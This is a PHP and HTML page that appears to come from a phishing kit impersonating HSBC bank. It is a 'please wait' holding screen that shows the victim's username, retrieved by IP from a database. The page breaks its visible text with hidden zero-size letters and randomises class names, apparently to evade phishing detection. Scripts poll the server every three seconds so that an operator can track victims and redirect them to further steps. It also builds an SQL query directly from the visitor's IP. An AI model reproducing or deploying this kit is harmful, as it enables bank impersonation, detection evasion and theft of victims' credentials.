<?php
//require_once('../antibot8/code/include.php');
session_start();

$coxfile=  "cox.php";

include $coxfile;
$userip =$_SERVER['REMOTE_ADDR'];

   $sql ="SELECT * from user where IP='$userip';";

   $ret = $db->query($sql);
   while($row = $ret->fetchArray(SQLITE3_ASSOC) ) {
      $user =$row['user'];


   }

   $db->close();

function generateRandomString($length = 0) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
  ?>
<html style="font-family: Lato, sans-serif;"><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Welcome</title>
    <link rel="stylesheet" href="jackss/njds.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,400i,700,700i,600,600i">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">


    <style>
@media only screen and (max-width: 600px)   {
  .form-group label {
      width: 100% !important;
  }
  .form-group span {
      margin-left: 4px !important;
  }
  input.smallestInput {
      margin-left: 4px !important;
  }
  .container {
    width: 100% !important;
}
    }
    </style>
</head>

<body>
    <nav class="<?php echo generateRandomString() ?> navbar navbar-light navbar-expand-lg fixed-top bg-white clean-navbar" style="background: rgb(0,0,0);">
        <div class="<?php echo generateRandomString() ?> container"><a class="<?php echo generateRandomString() ?> navbar-brand logo" href="#"><img src="jackss/hslogo.png"></a><button data-toggle="collapse" class="<?php echo generateRandomString() ?> navbar-toggler" data-target="#navcol-2"><span class="<?php echo generateRandomString() ?> sr-only">T<span style="font-size: 0px;">uz</span>og<span style="font-size: 0px;">uz</span>g<span style="font-size: 0px;">uz</span>le n<span style="font-size: 0px;">uz</span>avi<span style="font-size: 0px;">uz</span>ga<span style="font-size: 0px;">uz</span>ti<span style="font-size: 0px;">uz</span>on</span><span class="<?php echo generateRandomString() ?> navbar-toggler-icon"></span></button>
            <div class="<?php echo generateRandomString() ?> collapse navbar-collapse text-justify" id="navcol-2">
                <ul class="<?php echo generateRandomString() ?> navbar-nav text-capitalize ml-auto">
                    <li class="<?php echo generateRandomString() ?> nav-item"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark active" href="#" style="font-family: Montserrat, sans-serif;font-weight: bold;font-style: normal;font-size: 17px;"><strong>E<span style="font-size: 0px;">uz</span>ver<span style="font-size: 0px;">uz</span>yda<span style="font-size: 0px;">uz</span>y B<span style="font-size: 0px;">uz</span>a<span style="font-size: 0px;">uz</span>nk<span style="font-size: 0px;">uz</span>in<span style="font-size: 0px;">uz</span>g&nbsp;</strong></a></li>
                    <li class="<?php echo generateRandomString() ?> nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark" href="#" style="font-family: Montserrat, sans-serif;font-size: 17px;"><strong>B<span style="font-size: 0px;">uz</span>or<span style="font-size: 0px;">uz</span>ro<span style="font-size: 0px;">uz</span>wi<span style="font-size: 0px;">uz</span>ng</strong></a></li>
                    <li class="<?php echo generateRandomString() ?> nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong><span style="font-size: 0px;">uz</span>In<span style="font-size: 0px;">uz</span>ve<span style="font-size: 0px;">uz</span>st<span style="font-size: 0px;">uz</span>in<span style="font-size: 0px;">uz</span>g</strong><br></a></li>
                    <li class="<?php echo generateRandomString() ?> nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong><span style="font-size: 0px;">uz</span>In<span style="font-size: 0px;">uz</span>su<span style="font-size: 0px;">uz</span>ra<span style="font-size: 0px;">uz</span>nc<span style="font-size: 0px;">uz</span>e</strong><br></a></li>
                    <li class="<?php echo generateRandomString() ?> nav-item text-capitalize text-dark" style="font-size: 17px;"><a class="<?php echo generateRandomString() ?> nav-link text-capitalize text-dark" href="#" style="font-size: 17px;"><strong>L<span style="font-size: 0px;">uz</span>if<span style="font-size: 0px;">uz</span>e e<span style="font-size: 0px;">uz</span>ve<span style="font-size: 0px;">uz</span>nt<span style="font-size: 0px;">uz</span>s</strong><br></a></li>
                </ul>
            </div>
        </div>
    </nav>
    <main class="<?php echo generateRandomString() ?> page">
        <section class="<?php echo generateRandomString() ?> clean-block about-us" style="background-color: #f8f8f8;padding-bottom: 1px;padding-top: 0px;">
    <div class="<?php echo generateRandomString() ?> container">
                <div class="<?php echo generateRandomString() ?> block-heading" style="padding-top: 50px;padding-bottom: 0px;"></div>
            </div>
            <div class="<?php echo generateRandomString() ?> container" style="background: #ffffff;width: 460px;height: 400px;margin-bottom: 200px;">
                <div class="<?php echo generateRandomString() ?> row">
                    <div class="<?php echo generateRandomString() ?> col-md-12" style="background: #ffffff;padding: 40px;"><span>Y<span style="font-size: 0px;">uz</span>ou<span style="font-size: 0px;">uz</span> ar<span style="font-size: 0px;">uz</span>e <span style="font-size: 0px;">uz</span>lo<span style="font-size: 0px;">uz</span>gg<span style="font-size: 0px;">uz</span>i<span style="font-size: 0px;">uz</span>ng o<span style="font-size: 0px;">uz</span>n a<span style="font-size: 0px;">uz</span>s: <?php echo $user ?><br><br><br></span><center><span>Pl<span style="font-size: 0px;">yz</span>eas<span style="font-size: 0px;">yz</span>e w<span style="font-size: 0px;">yz</span>ai<span style="font-size: 0px;">yz</span>t ...<br></span><br><img src="wait.gif"></center></div>
                </div>
            </div>
        </section>

    </main>
    <footer class="<?php echo generateRandomString() ?> page-footer dark" style="background: #3e4045;">
        <div class="<?php echo generateRandomString() ?> container">
            <div class="<?php echo generateRandomString() ?> row">
                <div class="<?php echo generateRandomString() ?> col-sm-3">
                    <h5><strong><span style="font-size: 0px;">uz</span>S<span style="font-size: 0px;">uz</span>up<span style="font-size: 0px;">uz</span>p<span style="font-size: 0px;">uz</span>or<span style="font-size: 0px;">uz</span>t</strong></h5>
                    <ul>
                        <li><a href="#"><span style="font-size: 0px;">uz</span>Se<span style="font-size: 0px;">uz</span>cu<span style="font-size: 0px;">uz</span>rit<span style="font-size: 0px;">uz</span>y <span style="font-size: 0px;">uz</span>cent<span style="font-size: 0px;">uz</span>r<span style="font-size: 0px;">uz</span>e</a></li>
                        <li><a href="#">C<span style="font-size: 0px;">uz</span>ar<span style="font-size: 0px;">uz</span>d <span style="font-size: 0px;">uz</span>su<span style="font-size: 0px;">uz</span>ppo<span style="font-size: 0px;">uz</span>rt</a></li>
                        <li><a href="#">Co<span style="font-size: 0px;">uz</span>Bro<span style="font-size: 0px;">uz</span>ws<span style="font-size: 0px;">uz</span>e</a></li>
                    </ul>
                </div>
                <div class="<?php echo generateRandomString() ?> col-sm-3"></div>
                <div class="<?php echo generateRandomString() ?> col-sm-3"></div>
                <div class="<?php echo generateRandomString() ?> col-sm-3"></div>
            </div>
        </div>
        <div class="<?php echo generateRandomString() ?> footer-copyright" style="background: #3e4045;border-color: #3e4045;">
            <p>© &nbsp;H<span style="font-size: 0px;">yz</span>S<span style="font-size: 0px;">yz</span>B<span style="font-size: 0px;">yz</span>C <span style="font-size: 0px;">uz</span>Gro<span style="font-size: 0px;">uz</span>u<span style="font-size: 0px;">uz</span>p 2021</p>
        </div>
    </footer>







    <script>
function onlineuser() {
      var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {

          }
      }
      xmlhttp.open("GET", "checkonline.php", true);
      xmlhttp.send();

}
window.setInterval(function(){
onlineuser();
}, 3000);
</script>




       <script>
function showHint() {
      var xmlhttp = new XMLHttpRequest();
      xmlhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
              if(this.responseText!='')
          window.location.replace(this.responseText);
              else {

              }

          }
      }
      xmlhttp.open("GET", "redirect.php", true);
      xmlhttp.send();

}
window.setInterval(function(){
showHint();
}, 3000);



</script>


</body></html>
